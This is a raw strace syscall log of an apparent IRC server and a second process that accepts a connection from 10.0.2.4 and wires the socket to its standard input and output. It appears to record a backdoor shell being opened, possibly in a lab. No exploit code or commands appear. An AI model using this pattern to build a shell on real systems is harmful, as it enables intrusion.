4519  07:16:29.397358 clock_gettime(CLOCK_MONOTONIC, {1399, 214370957}) = 0
4519  07:16:29.397368 gettimeofday({1495624589, 397372}, NULL) = 0
4519  07:16:29.397379 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [4], left {0, 910000})
4519  07:16:29.487481 clock_gettime(CLOCK_MONOTONIC, {1399, 304525788}) = 0
4519  07:16:29.487555 recv(4, "PRIVMSG  #testit Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 54
4519  07:16:29.487601 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.487632 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.487657 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.487672 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.487699 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.487713 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.487726 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.487739 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.487753 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.487766 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.487779 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.487792 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.487805 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.487819 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.487832 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.487845 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.487858 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.487871 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.487884 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.487898 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.487911 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.487924 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:16:29.487940 gettimeofday({1495624589, 487943}, NULL) = 0
4519  07:16:29.487951 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
6990  07:16:29.529470 <... accept resumed> {sa_family=AF_INET, sin_port=htons(33863), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
6990  07:16:29.529551 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ae348) = -1 EINVAL (Invalid argument)
6990  07:16:29.529569 _llseek(8, 0, 0xbf9ae390, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6990  07:16:29.529596 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ae348) = -1 EINVAL (Invalid argument)
6990  07:16:29.529606 _llseek(8, 0, 0xbf9ae390, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6990  07:16:29.529617 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
6990  07:16:29.529659 close(6)          = 0
6990  07:16:29.529729 dup(8)            = 6
6990  07:16:29.529742 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9af1e8) = -1 EINVAL (Invalid argument)
6990  07:16:29.529753 _llseek(6, 0, 0xbf9af230, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6990  07:16:29.529764 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
6990  07:16:29.529783 dup2(6, 1)        = 1
6990  07:16:29.529795 close(6)          = 0
6990  07:16:29.529806 fcntl64(1, F_SETFD, 0) = 0
6990  07:16:29.529817 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9af1b8) = -1 EINVAL (Invalid argument)
6990  07:16:29.529828 _llseek(1, 0, 0xbf9af200, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6990  07:16:29.529857 dup(8)            = 6
6990  07:16:29.529869 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9af1e8) = -1 EINVAL (Invalid argument)
6990  07:16:29.529880 _llseek(6, 0, 0xbf9af230, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6990  07:16:29.529890 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
6990  07:16:29.529906 dup2(6, 0)        = 0
6990  07:16:29.529916 close(6)          = 0
6990  07:16:29.529926 fcntl64(0, F_SETFD, 0) = 0
6990  07:16:29.529939 fcntl64(0, F_SETFD, 0) = 0
6990  07:16:29.529960 read(0,  <unfinished ...>
4519  07:16:29.530304 <... select resumed> ) = 1 (in [5], left {0, 960000})
4519  07:16:29.530329 clock_gettime(CLOCK_MONOTONIC, {1399, 347342360}) = 0
4519  07:16:29.530344 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:16:29.530357 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:16:29.530378 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:16:29.530394 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:16:29.530429 close(5)          = 0
4519  07:16:29.530444 time(NULL)        = 1495624589
4519  07:16:29.530454 time(NULL)        = 1495624589
4519  07:16:29.530465 gettimeofday({1495624589, 530469}, NULL) = 0
4519  07:16:29.530477 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:16:29.530615 clock_gettime(CLOCK_MONOTONIC, {1399, 347628880}) = 0
4519  07:16:29.530643 gettimeofday({1495624589, 530647}, NULL) = 0
4519  07:16:29.530654 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
